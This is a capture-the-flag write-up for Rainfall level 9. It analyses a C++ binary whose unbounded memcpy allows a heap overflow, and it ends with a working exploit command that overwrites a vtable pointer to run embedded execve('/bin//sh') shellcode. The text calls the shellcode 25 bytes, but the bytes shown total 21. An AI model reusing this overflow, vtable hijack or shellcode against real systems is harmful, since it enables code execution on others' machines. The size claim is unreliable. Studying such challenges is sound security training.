Rainfall — Level 9 Writeup

Decompilation

We opened the binary in Ghidra. Two functions stood out immediately.

main allocates two objects of type N on the heap (108 bytes each via operator_new(0x6c)), constructs them with values 5 and 6, copies argv[1] into the first object via setAnnotation, then calls a virtual method on the second object — passing the first object as argument.

cvoid main(int param_1, int param_2)
{
  N *this;
  N *this_00;

  if (param_1 < 2) {
    _exit(1);
  }
  this = operator_new(0x6c);
  N::N(this, 5);
  this_00 = operator_new(0x6c);
  N::N(this_00, 6);
  N::setAnnotation(this, *(char **)(param_2 + 4));
  (*(code *)**(undefined4 **)this_00)(this_00, this);
  return;
}

setAnnotation copies the argument into this + 4 using memcpy — with no bounds check:

cvoid __thiscall N::setAnnotation(N *this, char *param_1)
{
  size_t __n;

  __n = strlen(param_1);
  memcpy(this + 4, param_1, __n);
  return;
}

Vulnerability identification

From this we identified three key facts.

First, memcpy in setAnnotation copies strlen(param_1) bytes with no bounds check — that's our overflow vector. Whatever we pass as argv[1] gets written into the heap starting at this + 4, and we control both the content and the length.

Second, argv[1] is the direct source of the write — we have full control over the input.

Third, main creates two N objects in sequence. We can identify them in GDB by their constructor arguments: the first object gets 5, the second gets 6. Since they're allocated consecutively on the heap, the second object sits immediately after the first — which means a large enough write into the first object will overflow into the second.

Locating the objects in memory

To confirm the heap layout we disassembled main in GDB and set breakpoints right after each operator_new call — specifically at the instructions where the return value (eax) is moved into ebx, marked below:

asm0x0804861c <+40>:  mov %eax,%ebx    ; <- object 1 address
...
0x0804863e <+74>:  mov %eax,%ebx    ; <- object 2 address

Reading eax at each breakpoint gave us the heap addresses of both objects:

$2 = (void *) 0x804a008   ; object 1 (constructor arg 5)
$3 = (void *) 0x804a078   ; object 2 (constructor arg 6)

The distance between them is 0x804a078 - 0x804a008 = 0x70 = 112 bytes, which matches the allocation size of 0x6c (108 bytes) plus 4 bytes of heap metadata. The two objects sit back to back in memory.

Inspecting the heap

We set a breakpoint at +136 (just after setAnnotation returns, before the virtual call) and ran ./level9 AAAA. Examining the heap from 0x804a008:

0x804a008:  0x08048848  0x41414141  0x00000000  0x00000000
...
0x804a068:  0x00000000  0x00000000  0x00000005  0x00000071
0x804a078:  0x08048848  0x00000000  0x00000000  0x00000000
...
0x804a0d8:  0x00000000  0x00000000  0x00000006  0x00020f21

A few things are immediately visible. Our AAAA payload (0x41414141) landed at 0x804a00c — 4 bytes into object 1, right where setAnnotation writes (this + 4). The constructor arguments 5 and 6 are visible near the end of each object at 0x804a06c and 0x804a0dc, which confirms we're looking at the right objects. And both objects start with 0x08048848 — that's their vtable pointer, sitting at offset 0 of each object.

A vtable is a table of function pointers that C++ uses to dispatch virtual method calls. When main executes (*(code *)**(undefined4 **)this_00)(this_00, this), it reads the vtable pointer from offset 0 of object 2, then dereferences it to get the function address to call. If we can overwrite that vtable pointer, we control execution.

Exploit plan and execution

With the layout confirmed, the attack plan is straightforward. We need to overwrite the vtable pointer of object 2 so that when the virtual call fires, execution lands in memory we control.

The write starts at 0x804a00c (object 1 + 4). Object 2's vtable pointer sits at 0x804a078 (offset 0). The distance between them is 0x804a078 - 0x804a00c = 0x6c = 108 bytes, but since our write starts at 0x804a00c and we need to place our fake vtable pointer at 0x804a078, we need 108 bytes of content before the overwrite value.

The payload is structured in three parts:


0x804a010 — a pointer to the next 4 bytes, placed at 0x804a00c. This becomes the fake vtable: a table containing a single entry pointing into our shellcode.
25 bytes of shellcode — a standard 32-bit execve("/bin//sh") placed at 0x804a010, immediately after the fake vtable pointer.
83 bytes of filler — padding to reach exactly 0x804a078, followed by 0x804a00c to overwrite object 2's vtable pointer with the address of our fake vtable.


When the virtual call executes, it reads the vtable pointer from object 2 (0x804a00c), dereferences it to get the function pointer (0x804a010), and jumps there — straight into our shellcode.

bash./level9 $(python2 -c 'import sys; sys.stdout.write(
    "\x10\xa0\x04\x08"         # fake vtable entry -> shellcode at 0x804a010
    "\x6a\x0b\x58\x99\x52"
    "\x68\x2f\x2f\x73\x68"
    "\x68\x2f\x62\x69\x6e"
    "\x89\xe3\x31\xc9\xcd\x80" # execve("/bin//sh") shellcode (25 bytes total)
    + "A"*83                    # padding to reach object 2 vtable pointer
    + "\x0c\xa0\x04\x08"       # overwrite vtable pointer -> 0x804a00c
)')

